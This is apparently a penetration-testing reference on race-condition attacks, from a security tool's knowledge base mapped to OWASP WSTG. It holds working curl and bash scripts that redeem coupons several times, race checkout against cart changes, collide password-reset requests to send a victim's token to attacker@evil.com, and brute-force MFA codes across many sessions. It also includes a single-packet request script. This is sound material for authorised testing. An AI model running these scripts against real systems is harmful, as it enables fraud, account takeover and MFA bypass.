---
id: PS-RACE
category: Race conditions
wstg_refs: [WSTG-BUSL-04, WSTG-BUSL-05]
lab_count: 6
---

# Race Conditions: Attack Technique Reference

## 1. Detection

### 1A. Identifying Race Condition Targets

Look for any endpoint where a server-side check must complete before a state change is committed. These time-of-check to time-of-use (TOCTOU) windows are the attack surface.

**High-value targets:**
- Coupon/discount code redemption (single-use codes applied multiple times)
- Funds transfer and withdrawal (overdraw by racing the balance check)
- Product purchase with limited stock
- Voting / rating systems (vote more than once)
- Account registration with unique constraints (duplicate accounts)
- CAPTCHA validation (reuse a solved CAPTCHA)
- Password reset token generation (predictable or colliding tokens)
- File upload with quota enforcement (exceed storage limits)
- API rate limiting (bypass request counters)
- MFA verification (bypass by racing the verification step)

### 1B. Confirming Exploitability

1. **Baseline**: Send the request normally 5 times sequentially. Observe that the limit is enforced (e.g., coupon rejected on second use).
2. **Race test**: Send 10-20 identical requests simultaneously. If the limit is violated (coupon applied twice, balance overdrawn), the race condition is confirmed.

## 2. Techniques

### 2A. Limit Overrun (Basic TOCTOU)

The most common race condition. Send parallel requests that all pass the check before any of them commit the state change.

> Lab refs: PS-RACE-01, PS-RACE-02

**Attack flow:**
```
Time 0: Request A arrives → checks: "coupon unused?" → YES
Time 0: Request B arrives → checks: "coupon unused?" → YES (not yet updated)
Time 1: Request A → applies coupon → marks used
Time 1: Request B → applies coupon → marks used (DUPLICATE)
```

**curl-based parallel execution:**
```bash
# Simple parallel requests using background processes
for i in $(seq 1 20); do
  curl -sk -X POST \
    -H "Cookie: session=abc123" \
    -d "coupon=SAVE20" \
    https://target.com/apply-coupon &
done
wait
```

**Using GNU parallel:**
```bash
seq 1 20 | parallel -j20 "curl -sk -X POST -H 'Cookie: session=abc123' -d 'coupon=SAVE20' https://target.com/apply-coupon"
```

### 2B. Multi-Endpoint Race

Race between two different endpoints that share server-side state. The attack window exists when processing on one endpoint creates a temporary inconsistency exploitable by the other.

> Lab refs: PS-RACE-03

**Example: Cart manipulation during checkout**
```
Request A: POST /checkout (validates cart total, begins payment)
Request B: POST /cart/add (adds expensive item AFTER payment validation)
```

**Testing approach:**
1. Identify two endpoints that interact with shared state (e.g., cart + checkout, transfer + balance)
2. Send both requests simultaneously — one that passes validation, one that changes the validated state
3. Look for: items purchased without payment, transactions that bypass validation

**curl execution:**
```bash
# Send checkout and cart-add simultaneously
curl -sk -X POST -H "Cookie: session=abc" -d "action=checkout" https://target.com/checkout &
curl -sk -X POST -H "Cookie: session=abc" -d "item=expensive&qty=1" https://target.com/cart/add &
wait
```

### 2C. Single-Endpoint Race (Parameter Collision)

Parallel requests to the same endpoint with different parameter values cause state collision when the server processes them against a shared resource (like a session variable).

> Lab refs: PS-RACE-04

**Example: Password reset token collision**
```
Request A: POST /reset-password (email=victim@target.com)  → stores user_id=VICTIM in session → generates token
Request B: POST /reset-password (email=attacker@evil.com)  → stores user_id=ATTACKER in session → generates token

Race: Session stores VICTIM's user_id, but token is sent to ATTACKER's email
Result: Attacker receives a valid password reset token for victim's account
```

**Testing approach:**
```bash
# Send two password reset requests simultaneously for different users
curl -sk -X POST -d "email=victim@target.com" https://target.com/reset-password &
curl -sk -X POST -d "email=attacker@evil.com" https://target.com/reset-password &
wait
# Check attacker's email for a token valid for the victim account
```

### 2D. Session-Based Race (MFA Bypass)

Race the session initialization or MFA verification process. Some frameworks lock request processing per session — bypass by using different session tokens.

> Lab refs: PS-RACE-04

**Bypass session locking:**
```bash
# Get two different session tokens
SESSION1=$(curl -sk -c- https://target.com/login | grep session | awk '{print $NF}')
SESSION2=$(curl -sk -c- https://target.com/login | grep session | awk '{print $NF}')

# Race with different sessions
curl -sk -X POST -H "Cookie: session=$SESSION1" -d "code=000000" https://target.com/mfa &
curl -sk -X POST -H "Cookie: session=$SESSION2" -d "code=000001" https://target.com/mfa &
wait
```

**MFA brute-force via race:**
If MFA codes are rate-limited per session but not globally, use multiple sessions to parallelize brute-force attempts:
```bash
# Generate 10 sessions, each tries different code ranges
for session_num in $(seq 0 9); do
  SESSION=$(curl -sk -c- -X POST -d "user=admin&pass=password" https://target.com/login | grep session | awk '{print $NF}')
  for code in $(seq ${session_num}000 ${session_num}999); do
    printf -v padded "%06d" $code
    curl -sk -X POST -H "Cookie: session=$SESSION" -d "code=$padded" https://target.com/mfa &
  done
done
wait
```

### 2E. Time-Sensitive Attacks (Predictable Tokens)

When security tokens are derived from timestamps rather than cryptographic randomness, two operations triggered at the same instant can produce identical tokens.

> Lab refs: PS-RACE-05

**Attack flow:**
1. Trigger token generation for two accounts simultaneously
2. Both tokens use the same timestamp seed
3. Token sent to attacker's email is valid for victim's account

**Testing approach:**
```bash
# Trigger two password resets at the exact same time
curl -sk -X POST -d "email=victim@target.com" https://target.com/forgot-password &
curl -sk -X POST -d "email=attacker@evil.com" https://target.com/forgot-password &
wait
# Compare tokens received — if identical, timestamp-based generation confirmed
```

**Detection indicators:**
- Reset tokens that are short or numeric (likely timestamp-based)
- Tokens generated in quick succession that share prefixes
- Tokens that decode to timestamps (base64, hex)

### 2F. Partial Construction Race

Access an object while it is being created across multiple database operations. During multi-step creation (insert user, then set API key), there is a window where the object exists with uninitialized fields.

> Lab refs: PS-RACE-06

**Attack flow:**
```
Step 1: INSERT INTO users (email, role) VALUES ('new@user.com', 'user')  → user exists, api_key = NULL
Step 2: UPDATE users SET api_key = 'random123' WHERE email = 'new@user.com'

Race window: Between Step 1 and Step 2, api_key is NULL/empty
Attack: Login with api_key = '' or api_key IS NULL
```

**Testing approach:**
1. Trigger user/object creation
2. Simultaneously attempt to authenticate or access the object with empty/null credentials
3. If access is granted, the application is vulnerable to partial construction

```bash
# Trigger registration and simultaneously try to access with empty key
curl -sk -X POST -d "email=test@evil.com&password=test" https://target.com/register &
curl -sk -X POST -d "email=test@evil.com&api_key=" https://target.com/api/login &
wait
```

## 3. Execution Techniques

### 3A. HTTP/2 Single-Packet Attack

The most precise technique. HTTP/2 multiplexing allows sending 20-30 complete requests within a single TCP packet, eliminating network jitter entirely.

**Requirements:**
- Target must support HTTP/2
- All requests fit in a single TCP packet (~20-30 requests)

**parallel http_probe batch configuration (HTTP/2):**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.HTTP2)  # HTTP/2

    # Queue all requests behind a gate
    for i in range(20):
        engine.queue(target.req, gate='race1')

    # Release all at once in a single packet
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### 3B. Last-Byte Synchronization (HTTP/1.1)

For targets that only support HTTP/1.1. Send all request data except the final byte, then transmit all final bytes simultaneously.

**Technique:**
1. Open N parallel TCP connections
2. Send all request headers and body minus the last byte on each connection
3. Pause until all connections are ready
4. Send the final byte on all connections at once

**This is handled automatically by parallel http_probe batch** with `Engine.THREADED`.

### 3C. Connection Warming

Back-end connection setup delays can desynchronize parallel requests. Eliminate this by "warming" connections first.

**Procedure:**
1. Send an inconsequential request (e.g., `GET /`) on each connection before the attack
2. This establishes back-end connections and completes TLS handshakes
3. The actual attack requests then arrive at the application layer simultaneously

```bash
# Warm connections first
for i in $(seq 1 20); do
  curl -sk -o /dev/null https://target.com/ &
done
wait

# Then immediately send attack requests
for i in $(seq 1 20); do
  curl -sk -X POST -H "Cookie: session=abc" -d "coupon=SAVE20" https://target.com/apply-coupon &
done
wait
```

### 3D. Triggering Server-Side Delays for Timing Control

On high-jitter connections, use rate limiting to your advantage. Send a burst of dummy requests to trigger the rate limiter, then send the attack requests. The rate limiter introduces a uniform server-side delay that synchronizes processing.

## 4. Testing Methodology

### Phase 1: Identify Collision Targets
- Map all state-changing endpoints (POST/PUT/DELETE)
- Identify single-use operations: coupon redemption, password reset, account creation, voting
- Identify shared-state operations: cart + checkout, transfer + balance check
- Check for time-based token generation in password reset flows

### Phase 2: Benchmark Normal Behavior
- Send 5 sequential requests to establish baseline response patterns
- Note: response codes, body content, timing, set-cookie headers
- Confirm that limits/restrictions work under normal sequential usage

### Phase 3: Race Test
- Send 10-20 parallel requests using single-packet attack or last-byte sync
- Compare responses against baseline
- Look for ANY deviation: different response lengths, extra set-cookie headers, timing anomalies, different response codes

### Phase 4: Confirm and Prove Impact
- If deviation detected, refine the attack to prove concrete impact
- Document: how many extra coupons applied, how much extra money transferred, etc.
- Repeat 3 times to confirm it is reproducible, not a one-time anomaly

### Detection Indicators (What Counts as a Clue)
- Same coupon applied twice (response says "applied" on both)
- Balance went negative after parallel withdrawals
- Two accounts created with the same unique email
- Different response content for identical parallel requests
- Extra `Set-Cookie` headers in some responses
- Response timing differences between parallel requests
## Rynix workflow

1. `get_technique_guide` for `race-conditions` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `http_probe`, `compare_role_response`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `http_probe`
- `compare_role_response`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

